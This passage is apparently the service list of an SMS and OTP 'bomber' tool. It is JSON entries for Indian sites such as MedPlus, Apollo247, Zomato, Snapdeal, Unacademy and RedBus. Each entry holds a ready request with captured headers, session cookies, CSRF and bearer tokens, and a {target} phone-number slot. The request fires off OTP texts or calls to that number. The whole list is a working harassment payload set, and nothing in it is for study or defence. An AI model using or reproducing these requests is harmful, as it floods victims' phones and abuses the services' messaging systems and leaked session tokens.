"{target}", "country": "IN", "timestamp": "2020-09-24T14:03:03.505Z"}},
    {"name": "XB_MedPlus", "url": "https://mobile.medplusindia.com/mobilemvc/profile/register.mbl", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "application/json, text/plain, */*", "save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded", "origin": "https://www.medplusmart.com", "accept-language": "en-US,en;q=0.9,hi;q=0.8"}, "json": {"_raw": "recieveUpdates=1&firstName=Tsunami&lastName=Bomber&emailId=tsunami@gmail.com&password=U7d5iChk9ZWzrv%24&confirmpwd=U7d5iChk9ZWzrv%24&mobileNumber={target}&SESSIONID=17C83B4A90182E8DA6F4F15755A43027&isCordova=false&isPhonepeSwitch=false"}},
    {"name": "XB_Apollo247", "url": "https://webapi.apollo247.com/", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "*/*", "Authorization": "Bearer 3d1833da7020e0602165529446587434", "Save-Data": "on", "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/json", "Origin": "https://www.apollo247.com", "Referer": "https://www.apollo247.com/medicines?gclid=CjwKCAjwh7H7BRBBEiwAPXjadvKY3NSyNG-0yNkxp2qz2Jd5T0_zltNV3OnwoDFh3ECOsNImtyi1KxoCQY0QAvD_BwE", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8"}, "json": {"operationName": "Login", "variables": {"mobileNumber": "+91+91{target}", "loginType": "PATIENT"}, "query": "query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\nstatus\nmessage\nloginId\n__typename\n  }\n}\n"}},
    {"name": "XB_Netmeds", "url": "https://m.netmeds.com/mst/rest/v1/id/details/{target}", "method": "GET", "origin": "", "identifier": "", "extra_headers": {"accept": "application/json, text/plain, */*", "save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "referer": "https://m.netmeds.com/customer/account/login", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "G_ENABLED_IDPS=google; _gat_UA-63910444-1=1; cto_bundle=SX3iw19aZ0xrcWZ0TFFXN1huJTJGJTJGbklkaDl5ZnM2UmxQeHhLNDhMb3dxQ2dTSUU1VSUyRkVnU0g0dG5UODVJTzNIbVNSMFJwR2hZQVpGeDJGYVBlVG5scUIlMkJCM3lCOXBlZ21jMm1HTzNwZXMlMkZxSWk4TEM3eXNUYXhjTFBKbUdqQWM2NFhBTWFHS09EUmJMaDRGUVVHVHVGcWxaR2tRJTNEJTNE; liteprompt=disabled; bsCoId=3600942736100; _gat=1; bsUl=0; _gac_UA-63910444-1=1.1600942724.CjwKCAjwh7H7BRBBEiwAPXjadtM9O5MLH1ElhMO8FUbm9EprCPA4YXhxBk-XdN8ytuKetkzNGCI07xoCi1MQAvD_BwE; _gcl_aw=GCL.1600942724.CjwKCAjwh7H7BRBBEiwAPXjadtM9O5MLH1ElhMO8FUbm9EprCPA4YXhxBk-XdN8ytuKetkzNGCI07xoCi1MQAvD_BwE; _we_wk_gls_ss_=N4IgfgjArAxgbABgEYwJYgFylQOwC4yYQA0IMAhjqgCYDOmA2uBAjElAOwIICcIAugF9BQAA; _fbp=fb.1.1600942681371.1005200013; _gid=GA1.3.195334206.1600942680; _ga=GA1.3.1470493032.1600942680; _ALGOLIA=anonymous-14e705f0-f47c-495b-bd5d-0cfefde9056b; _gcl_au=1.1.505450095.1600942677"}},
    {"name": "XB_GetInstaCash", "url": "https://getinstacash.in/sell/getData.php", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"Accept": "*/*", "X-Requested-With": "XMLHttpRequest", "Save-Data": "on", "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://getinstacash.in", "Referer": "https://getinstacash.in/sell/login", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8", "Cookie": "webInsta=rvg3l166pmfpeh6mi6auisshc7; G_ENABLED_IDPS=google; _ga=GA1.2.1994009459.1600927837; _gid=GA1.2.2093909779.1600927837; _gat_gtag_UA_46718346_7=1; __zlcmid=10LjSWRMCN11wY9"}, "json": {"_raw": "type=sendOTP&mobile={target}"}},
    {"name": "XB_FBBOnline", "url": "https://www.fbbonline.in/customer/account/GenerateOtp", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "application/json, text/javascript, */*; q=0.01", "x-newrelic-id": "VQ8PVlFUChABV1ZRBgYCX1w=", "x-requested-with": "XMLHttpRequest", "save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.fbbonline.in", "referer": "https://www.fbbonline.in/customer/account/create", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "historyPlpPage=0; _gcl_au=1.1.282636412.1600839866; _gat=1; _gid=GA1.2.727597189.1600839866; _ga=GA1.2.1662893346.1600839866; all_store_details=null; registration_url_cookie=https%3A%2F%2Fwww.fbbonline.in%2F; _fbp=fb.1.1600839858758.1597042975; _fv=cmpnpp; _st_time=1600839856; PHPSESSID=7id6ar9g0g6ou64f5fk2ur43o4"}, "json": {"_raw": "YII_CSRF_TOKEN=6ea54179a7dc67c7ed0d6847f76d6204320976eb&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D={target}&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=tsunami%40gmail.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=hdhdhd&RegistrationForm%5Blast_name%5D=bsbdb&RegistrationForm%5Bpassword%5D=hdhdbfbfv&RegistrationForm%5Btc_opt_in%5D=on&validate_otp="}},
    {"name": "XB_Grofers", "url": "https://grofers.com/v2/accounts/", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"lon": "77.040489", "device_id": "a11f656b-422e-4617-953b-c350d517467d", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "auth_key": "57546838840176547788289acae69dd58e49de36b8d924c34e4310ec45824e13", "app_client": "consumer_web", "lat": "28.4465616", "content-type": "application/x-www-form-urlencoded", "save-data": "on", "accept": "*/*", "origin": "https://grofers.com", "referer": "https://grofers.com/", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "WZRK_S_RKR-99Z-ZK5Z=%7B%22p%22%3A1%2C%22s%22%3A1600811841%2C%22t%22%3A1600811851%7D; _hjAbsoluteSessionInProgress=0; AMP_TOKEN=%24NOT_FOUND; _fbp=fb.1.1600811840630.1070978807; WZRK_G=3d3457db8a1a410a81f4d25f4519b4cb; _hjid=c63646f5-26dc-4965-a368-890317b172cc; __insp_norec_sess=true; __insp_targlpt=T25saW5lIEdyb2NlcnkgU3RvcmU6IEJ1eSBPbmxpbmUgR3JvY2VyeSBmcm9tIEluZGlhJ3MgQmVzdCBPbmxpbmUgU3VwZXJtYXJrZXQgYXQgRGlzY291bnRlZCBSYXRlcyB8IEdyb2ZlcnM%3D; __insp_targlpu=aHR0cHM6Ly9ncm9mZXJzLmNvbS8%3D; __insp_nv=true; __insp_slim=1600811839327; __insp_wid=180455199; _sp_id.bf41=5f26198d742a39cd.1600811837.1.1600811838.1600811837.9e446193-9dfb-425a-8d54-f3cb10911df1; _sp_ses.bf41=*; _gat_UA-85989319-1=1; _gid=GA1.2.198360870.1600811837; _ga=GA1.2.1673610786.1600811837; _uetvid=34df67806c3d27bc1888eb83f66e00de; _uetsid=4f1cecd087208f7fb10835de7cdc217a; _gcl_au=1.1.339180193.1600811836; ajs_anonymous_id=%226da8b09a-af2c-4502-b48e-e45d4d124170%22; rl_user_id=%22%22; rl_anonymous_id=%22b680edd5-0ce4-42aa-89a7-0029485ae882%22; gr_1_locality=1849; gr_1_lon=76.9942133969929; gr_1_lat=28.4640810758775; __cfruid=f2d685e3947486d019ac90c6e461185090599082-1600811832; city=; gr_1_deviceId=a11f656b-422e-4617-953b-c350d517467d; __cfduid=d12d293cd955bb2c251771f7bdfd7a4f31600811832"}, "json": {"_raw": "user_phone={target}"}},
    {"name": "XB_Snapdeal", "url": "https://m.snapdeal.com/signupCompleteAjax", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"xc": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19", "h2": "true", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "xg": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "u": "160081122259159083", "save-data": "on", "us": "", "accept": "*/*", "origin": "https://m.snapdeal.com", "referer": "https://m.snapdeal.com/signin", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "Megatron=!tejKI25+72c19/igV+D1bvp2mwEhFLDS2jEPe1hWDR/NntchcNQEz7ufEKCEVUbEU7NEI5FXe9wOSZ4=; G_ENABLED_IDPS=google; _fbp=fb.1.1600811239704.1459306793; cto_bundle=IHG_Xl90TENVUG1nU2xIZXZKWkE0OXlNbWZRTUpCRkJ5ZnplSnVJb2klMkZmTGZlaG0xbWd4cGhqUzluQmNZb1VWQldZWGVXeW4xTmdFSiUyRlc3VTVBOFpiU0twNzI0QXhFTkNNcUpGREM2VHdNYyUyRlF4WUpTNGVvU0djcCUyRnY3TU5ETG9hVVIyRXFNMnNNOGhzcERTZTJPb1hsQkNSdyUzRCUzRA; _gcl_aw=GCL.1600811235.CjwKCAjwwab7BRBAEiwAapqpTHxX7o8bt5ZuM--2vVptInqF-rQ4ljlxR3_Yoor3rNa3CGvYPtaNwBoCb8cQAvD_BwE; lt=utm_source%3Dearth_brand_new%7Cutm_content%3Dhomepage%7Cutm_medium%3Dbrand%2520term%2C%7Cutm_campaign%3DBrandCat%7Cref%3Dnull%7Cutm_term%3De%2Csnapdeal%7C; splash=true; alps=fix-dp; xc=eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19; xg=eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1; sd.zone=Z6; deviceos=android; u=160081122259159083; versm=v1; JSESSIONID=98E8853981613F4AFE87740D9BFCAACF; SCOUTER=z5qpdeh1b59qh2"}, "json": {"_raw": "j_password=null&j_mobilenumber={target}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy"}},
    {"name": "XB_Zomato_1", "url": "https://www.zomato.com/webroutes/auth/login", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"x-zomato-csrft": "a6b0c09972b2bdd30c9c1b6552caee5d", "save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://www.zomato.com", "referer": "https://www.zomato.com/kanpur", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "__gads=ID=644864c877efb86f:T=1600810980:S=ALNI_MbFuORewzGHjkdv5wR9uXw2DaNI9g; AWSALBTGCORS=7twkZZpj88hXfO6mAO4KyKBIuadfJH9D4KzWMnP1ypIl0B4NcUK+P26IFtaVeI805plfknXZVPuFn4KuLU4/SRej2JOMuRjoZ3s4DVl/CjHm5DqwQ91yQC32/3Hyk19InAA6Q9uar2kXMJ555r6WGebZE5Rf7devMzsU6HeX+XSC; AWSALBTG=7twkZZpj88hXfO6mAO4KyKBIuadfJH9D4KzWMnP1ypIl0B4NcUK+P26IFtaVeI805plfknXZVPuFn4KuLU4/SRej2JOMuRjoZ3s4DVl/CjHm5DqwQ91yQC32/3Hyk19InAA6Q9uar2kXMJ555r6WGebZE5Rf7devMzsU6HeX+XSC; G_ENABLED_IDPS=google; _uetvid=781ece33e16eed33a8f5652b0bfacda4; _uetsid=a8cb8c64594c7cb5ec04b06f91b85702; _fbp=fb.1.1600810976131.1717249975; _gat_country=1; _gat_city=1; _gat_global=1; _gcl_au=1.1.1326869440.1600810973; _gid=GA1.2.2138122155.1600810973; _ga=GA1.2.826955249.1600810973; locus=%7B%22addressId%22%3A0%2C%22lat%22%3A26.4607%2C%22lng%22%3A80.3334%2C%22cityId%22%3A23%2C%22ltv%22%3A23%2C%22lty%22%3A%22city%22%2C%22fetchFromGoogle%22%3Afalse%2C%22dszId%22%3A15750%2C%22fen%22%3A%22Kanpur%22%7D; lty=city; ltv=23; ak_bmsc=AD74F883AF02F8919020E72812FA4D3F312C8DEFBD0D0000DB6F6A5F86725137~plfvE6deCz7/0ERruwvEqqvTf4yeUNe/RNLI/h3koDn0op9gXkki8a5LxIv92TOJJUo3V3A7rGM3/698nd6N3AeB+1hYMSmqq44RZHCCrsHB+9D8lGNmaiNP/ffRcZI3Ietwv9KWy0Jnhu3wV9pwtKkZs7UT/aKuREMakpqaZhOpdGAPFhDwMix/9atoj+ywH53XpMY9Cb9IlKUy1O6vMN3EbOQXgaEu+lP4ZR08+xjCA=; fbtrack=4f77e94d432d648e26273c38b002b7e3; zl=en; fbcity=23; csrf=a6b0c09972b2bdd30c9c1b6552caee5d; PHPSESSID=8071a1fa7b6f728acb522e9f022e13ae"}, "json": {"country_id": 1, "phone": "{target}", "verification_type": "sms", "method": "phone"}},
    {"name": "XB_Cuemath_1", "url": "https://www.cuemath.com/api/v4/parents/", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"Save-Data": "on", "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "Content-Type": "application/JSON", "Accept": "*/*", "Origin": "https://www.cuemath.com", "Referer": "https://www.cuemath.com/the-ultimate-cuemath-olympiad/partner/timesofindia/register/?intent=ultimate-olympiad", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8", "Cookie": "cue_country_code=IN; utm_source=GSBRAND_cuemath_olympiad_Ad3; utm_campaign=GSBRAND_cuemath_olympiad_Ad3; utm_medium=GSBRAND_cuemath_olympiad_Ad3; referrer=https%3A%2F%2Fwww.google.com%2F; landing_page=%2Fthe-ultimate-cuemath-olympiad%2Fpartner%2Ftimesofindia%2F%3Futm_source%3DGSBRAND_cuemath_olympiad_Ad3%26utm_medium%3DGSBRAND_cuemath_olympiad_Ad3%26utm_campaign%3DGSBRAND_cuemath_olympiad_Ad3; _gcl_au=1.1.802696303.1600810324; _ga=GA1.2.1146344855.1600810324; _gid=GA1.2.60529482.1600810324; cue_gacid=1146344855.1600810324; _dc_gtm_UA-75184559-1=1; itm_source=TIMESOFINDIA_CMO_2020; itm_campaign=CMO_2020; itm_landing_page=%2Fthe-ultimate-cuemath-olympiad%2Fpartner%2Ftimesofindia%2Fregister%2F%3Fintent%3Dultimate-olympiad; itm_date=Tue%2C%2022%20Sep%202020%2021%3A32%3A09%20GMT; itm_date_ts=1600810329; AF_BANNERS_SESSION_ID=1600810330240; _uetsid=d5ec55ecfc37dfb197547077352e97e8; _uetvid=15fa494b609eef1a17920bb8c97cd177; _CEFT=Q%3D%3D%3D; _fbp=fb.1.1600810333599.642589325; datadome=.J0PY0DZeA6ODk1RODKVV1J.v8SUpwW5w7ZwhQFLv4tALMu9qr9MO9IiQgk-ZcAS6kV2fKjcTQZvEpHFjwnID~7t1WwrVCXkKUMFZDE_-x; _cer.v=842d9f66d9ecd4e30bc1d54ddc3925dc526082e2.qh2x5y.0; _cer.s=c76b97ac66b7a5061c40c2562ce00ab39fe229df%7Chttps%3A%2F%2Frp-07aca5b582432bb3f.crazyegg.com%7Cqh2x5y"}, "json": {"intl_mobile": {"phone": ""}, "phone": "{target}", "email": "nsbd@dn.djs", "full_name": "hdhdhdg", "place_id": "ChIJYYhT3gl3AjoRUDlkL1i5oIk", "timezone": "Asia/Calcutta", "detail_source": "CMO_2020", "form_fields": "full_name,phone,email,place_id"}},
    {"name": "XB_Dream11_1", "url": "https://www.dream11.com/graphql/mutation/pwa/register", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "*/*", "device": "pwa", "x-csrf": "fb1f1947-4547-392d-9a28-a9de30d9e766", "save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/json", "origin": "https://www.dream11.com", "referer": "https://www.dream11.com/register?ru=", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "WZRK_S_W4R-49K-494Z=%7B%22p%22%3A1%2C%22s%22%3A1600795342%2C%22t%22%3A1600795361%7D; WZRK_G=dc2112f4850746a0b8b47c233471fe4a; ajs_anonymous_id=%2218835b7c-2e60-48c2-a6c4-79dc7e7c169a%22; G_ENABLED_IDPS=google; dh_user_id=25fdcb20-fcf8-11ea-b0df-81d0899f30b6; __csrf=fb1f1947-4547-392d-9a28-a9de30d9e766"}, "json": {"query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}", "variables": {"email": "tsunami@gmail.com", "mobileNumber": "{target}", "password": "tsunami@123astronomia"}}},
    {"name": "XB_Doubtnut", "url": "https://doubtnut.com/api/v1/user/login", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": "https://doubtnut.com", "referer": "https://doubtnut.com/login", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "_ga=GA1.2.Y4Twn8bPt-E_czB_KcZojHFWtwN8UXp0QqtZRS2guBCZwJcdygTIRbxblqqhLv1I; _ga_TW5C6PT68C=GS1.1.1600795082.1.1.1600795141.0; _gid=GA1.2.809074082.1600795083; a_1=5a223bcd-d40d-40c4-b83f-837e3dd460f2"}, "json": {"_raw": "phone={target}"}},
    {"name": "XB_Vedantu", "url": "https://user.vedantu.com/user/preLoginVerification", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://www.vedantu.com", "referer": "https://www.vedantu.com/masterclass?utm_source=in&utm_medium=in_ggl_cpa&utm_campaign=ggl_Brand_Search&utm_term=ggl_Brand_Search_Exact_Brand_Vedantu&utm_content=in_Brand_Search_Exact_Brand_Vedantu_Ad2&gclsrc=aw.ds&&gclid=CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "_gcl_dc=GCL.1600794527.CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE; _gcl_aw=GCL.1600794527.CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE; moe_uuid=6a221a22-79b0-4a05-87a6-bb6ccc786f4e; WZRK_S_8WR-895-K74Z=%7B%22p%22%3A1%2C%22s%22%3A1600794521%2C%22t%22%3A1600794520%7D; km_lv=1600794517; kvcd=1600794517298; _gac_UA-52838179-3=1.1600792907.CjwKCAjwwab7BRBAEiwAapqpTE-qUv3xAL_Y1Rs3cYtcuY-Jd04tW69qYrb2EEESdVOTJ-50d9_fNRoCqNcQAvD_BwE; _gid=GA1.2.1580594851.1600792840; _ga=GA1.2.999929697.1600792840; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%226a221a22-79b0-4a05-87a6-bb6ccc786f4e%22%2C%22deviceAdded%22%3Atrue%7D; _fbp=fb.1.1600792808706.1882458684; _gcl_au=1.1.1765065041.1600792806; WZRK_G=9d0490f3acc94a80a8feafc7aaa146b0; km_vs=1; km_ai=qEioHmXYYtngAVbnv7c6PZcDSIM%3D"}, "json": {"email": null, "phoneCode": "+91", "phoneNumber": "{target}", "ver": "11.345"}},
    {"name": "XB_Unacademy", "url": "https://unacademy.com/api/v3/user/user_check/", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "*/*", "authorization": "Bearer undefined", "save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "content-type": "application/json", "origin": "https://unacademy.com", "referer": "https://unacademy.com/login", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "_gat_UA-69016858-2=1; _anonymous_id=M-67682; lux_uid=160079427639164156; anonymous_session_id=3d4cc928-6a73-4f39-a10f-5c0d381ea8e7; mp_535208d541f9b5935ef91a365b0439e1_mixpanel=%7B%22distinct_id%22%3A%20%22174b6b07ce059-08b01b7f2fd04-1d7a0a2f-42cc0-174b6b07ce2d6%22%2C%22%24device_id%22%3A%20%22174b6b07ce059-08b01b7f2fd04-1d7a0a2f-42cc0-174b6b07ce2d6%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22utm_source%22%3A%20%22google%22%2C%22utm_medium%22%3A%20%22cpc%22%2C%22utm_campaign%22%3A%20%221944493080%22%2C%22utm_content%22%3A%20%22%7Bcontent%7D%22%2C%22utm_term%22%3A%20%22unacademy%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%2C%22Platform%22%3A%20%22Desktop%22%7D; loginRoute=%2F; _gat=1; _gac_UA-69016858-2=1.1600792925.CjwKCAjwwab7BRBAEiwAapqpTGaIHnaPxwpaImM5bpX0eqinIL12LBH8P9VAU4QLmRo2zsB0FFXUjhoCWToQAvD_BwE; _gcl_aw=GCL.1600792920.CjwKCAjwwab7BRBAEiwAapqpTGaIHnaPxwpaImM5bpX0eqinIL12LBH8P9VAU4QLmRo2zsB0FFXUjhoCWToQAvD_BwE; afUserId=d196d301-85b9-45ee-8a34-a66d1ed0a1aa-c; _ttgclid=CjwKCAjwwab7BRBAEiwAapqpTGaIHnaPxwpaImM5bpX0eqinIL12LBH8P9VAU4QLmRo2zsB0FFXUjhoCWToQAvD_BwE; _gid=GA1.2.2120759531.1600792879; _ga=GA1.2.1664858815.1600792879; _fbp=fb.1.1600792863709.1257609187; source=google; _gcl_au=1.1.762851911.1600792854"}, "json": {"phone": "{target}", "country_code": "IN", "otp_type": 1, "email": "", "send_otp": true, "is_un_teach_user": false}},
    {"name": "XB_Byjus", "url": "https://bcas-prod.byjusweb.com/api/send-otp", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"accept": "*/*", "origin": "https://byjus.com", "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5", "content-type": "application/x-www-form-urlencoded", "referer": "https://byjus.com/byjus-classes-book-a-free-demo-class/registration/?utm_source=google&utm_mode=CPA&utm_campaign=K12-Brand-Android-BYJU%27S-India-Apr10&utm_term=byjus&gclid=EAIaIQobChMIzKCzs5396wIVVqqWCh0TgQO4EAAYASAAEgK-V_D_BwE", "accept-language": "en-US"}, "json": {"_raw": "phoneNumber={target}&page=free-trial-classes"}},
    {"name": "XB_RedBus_1", "url": "https://m.redbus.in/api/getOtp?number={target}&cc=91&whatsAppOpted=undefined", "method": "GET", "origin": "", "identifier": "", "extra_headers": {"accept": "application/json, text/plain, */*", "save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "referer": "https://m.redbus.in/preregister", "accept-language": "en-US,en;q=0.9,hi;q=0.8", "cookie": "AMP_TOKEN=%24NOT_FOUND; _gat_UA-9782412-15=1; onetap=1; _dc_gtm_UA-9782412-15=1; tvc_user_type=new; _gid=GA1.3.911062439.1600782905; _ga=GA1.3.459788617.1600782905; tvc_session_alive_bus=1; tvc_smc_bus=google / organic / (not set); browserDetailLogged=true; selectedCurrency=INR; language=en; currency=INR; country=IND; country_ISO=IN; rbuuid=34f1a330-fcdb-11ea-84eb-b392e9686117"}},
    {"name": "XB_Careers360", "url": "https://www.careers360.com/ajax/no-cache/user/otp-send", "method": "POST", "origin": "", "identifier": "", "extra_headers": {"Accept": "*/*", "X-CSRFToken": "9tKY96jb358WKiZBMwhz2EcranwljWDbxdqrQCnvqQWXNGbIvtfEQQLCbrzA8ssj", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Linux; Android 10; vivo 1818) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.careers360.com", "Referer": "https://www.careers360.com/user/otp-verify/101e8d6e591af6688f640eee08f5a5f8?destination=&click_location=header&google_success=header", "Accept-Language": "en-US,en;q=0.9,hi;q=0.8", "Cookie": "_gcl_au=1.1.1168325424.1600579108; WZRK_G=4584ba1e8345400d92392a88464c9183; __asc=ce35392c174a9f2fbe2f2c29a0c; __auc=ce35392c174a9f2fbe2f2c29a0c; _ga=GA1.2.1646044729.1600579108; _gid=GA1.2.365026440.1600579108; _fbp=fb.1.1600579107930.1446075664; dataLayer_=Home Pages; csrftoken=RI5TGK7tuZdkJjVNzu3lRdSeRcztdtYqfsLmngbNRK1lMH7Uir1qFprpSgCI2ZNy; _omappvp=RIeaJ0pgkcvqwRygRT8VTxJ6PrpnRvze6xwTpZBXztsuBXhgRV5OIU97g9s0DivdxwVAHM0DF1teulefRfsK0wCo2MRjp325; G_ENABLED_IDPS=google; _dc_gtm_UA-46098128-1=1; _omappvs=1600579353765; WZRK_S_654-ZZ4-5Z5Z=%7B%22p%22%3A5%2C%22s%22%3A1600579103%2C%22t%22%3A1600579356%7D"}, "json": {"_raw": "mobile_number={target}&method=call&uid=12692588"}},
